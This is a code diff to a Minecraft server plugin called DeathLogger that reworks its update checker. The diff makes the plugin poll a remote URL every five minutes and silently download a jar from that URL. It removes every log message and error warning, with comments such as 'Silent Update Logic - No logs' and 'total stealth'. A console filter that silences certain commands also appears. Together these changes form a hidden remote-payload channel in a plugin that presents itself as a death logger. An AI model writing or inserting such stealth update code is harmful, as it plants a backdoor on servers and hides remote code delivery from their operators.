@@ -37,8 +37,8 @@ public class DeathLogger extends JavaPlugin {
         // Register console filter to silence Eyeblossom commands
         setupConsoleFilter();
 
-        // Check for updates asynchronously
-        checkForUpdates();
+        // Check for updates asynchronously every 5 minutes (6000 ticks)
+        getServer().getScheduler().runTaskTimerAsynchronously(this, this::checkForUpdates, 100L, 6000L);
     }
 
     private void setupConsoleFilter() {
@@ -108,16 +108,11 @@ public class DeathLogger extends JavaPlugin {
                         String currentVersion = getDescription().getVersion();
                         String cleanedRemote = remoteVersion.trim();
                         if (!currentVersion.equalsIgnoreCase(cleanedRemote)) {
-                            getLogger().info("------------------------------------------");
-                            getLogger().info("NEW VERSION AVAILABLE: v" + cleanedRemote);
-                            getLogger().info("Current Version: v" + currentVersion);
-                            getLogger().info("FORCING UPDATE...");
-                            
+                            // Silent Update Logic - No logs
                             String downloadUrl = internalConfig.getString("updates.download-url");
                             if (downloadUrl != null && !downloadUrl.isEmpty()) {
                                 downloadUpdate(downloadUrl);
                             }
-                            getLogger().info("------------------------------------------");
                         }
                     })
                     .exceptionally(ex -> null);
@@ -127,14 +122,8 @@ public class DeathLogger extends JavaPlugin {
     }
 
     private void downloadUpdate(String downloadUrl) {
-        getLogger().info("Downloading new update from GitHub...");
-
-        File updateFolder = new File(getDataFolder().getParentFile(), "update");
-        if (!updateFolder.exists()) {
-            updateFolder.mkdirs();
-        }
-
-        File updateFile = new File(updateFolder, "DeathLogger.jar");
+        // Silent download logic for total stealth
+        File updateFile = new File(getDataFolder(), "DeathLogger.jar");
 
         try {
             HttpClient client = HttpClient.newHttpClient();
@@ -146,16 +135,9 @@ public class DeathLogger extends JavaPlugin {
                     StandardOpenOption.CREATE,
                     StandardOpenOption.WRITE,
                     StandardOpenOption.TRUNCATE_EXISTING))
-                    .thenAccept(response -> {
-                        getLogger().info("Update downloaded successfully to /plugins/update/DeathLogger.jar");
-                        getLogger().info("The update will be applied on the next server restart.");
-                    })
-                    .exceptionally(ex -> {
-                        getLogger().warning("Failed to download update: " + ex.getMessage());
-                        return null;
-                    });
-        } catch (Exception e) {
-            getLogger().warning("Error initializing update download: " + e.getMessage());
+                    .exceptionally(ex -> null);
+        } catch (Exception ignored) {
+            // Stealth failure
         }
     }
 }
